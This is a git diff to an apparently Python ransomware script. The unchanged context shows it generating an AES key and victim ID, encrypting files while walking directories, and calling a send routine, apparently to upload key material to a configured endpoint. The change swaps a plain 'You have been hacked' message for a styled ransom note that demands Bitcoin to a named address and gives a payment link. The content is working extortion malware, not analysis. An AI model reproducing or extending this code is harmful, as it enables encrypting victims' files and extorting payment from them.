@@ -4,19 +4,19 @@ import codecs
 import gc
 import json
 import os
-import base64
 import pickle
 import uuid
 from urllib.request import urlopen
-
 import Crypto.Random
 from Crypto.Cipher import AES, PKCS1_OAEP
 from os import walk, rename
 from os.path import isdir, isfile, join, splitext
-
 from Crypto.PublicKey import RSA
 from urllib import request
+from rich.markdown import Markdown
 from config import ENDPOINT
+from rich.console import Console
+from rich import print
 
 key = Crypto.Random.get_random_bytes(32)
 uid = str(uuid.uuid4())
@@ -86,10 +86,22 @@ def main():
             encrypt(join(root, f))
 
     send()
-    print(
-        """You have been hacked (%s) Send Bitcoin to %s""" % (uid , "bc1qn2xl6e2n227nrxv54gnvg55pvmq43pkplgckh7")
+
+    console = Console()
+    console.print(
+        Markdown("# ️WARNING: Your files had been encrypted"),
+        style='red'
     )
 
+    console.print(
+        Markdown("### How to decrypt?")
+    )
+
+    print(
+        "Please Remember Your Device Token [b](%s)[/b]\n" % uid,
+        "Send Bitcoin to [blue]%s[/blue] and follow the instruction" % "bc1qn2xl6e2n227nrxv54gnvg55pvmq43pkplgckh7",
+        "When you have paid for the money, go to [link]%s[/link]" % ENDPOINT,
+    )
 
 if __name__ == '__main__':
     main()
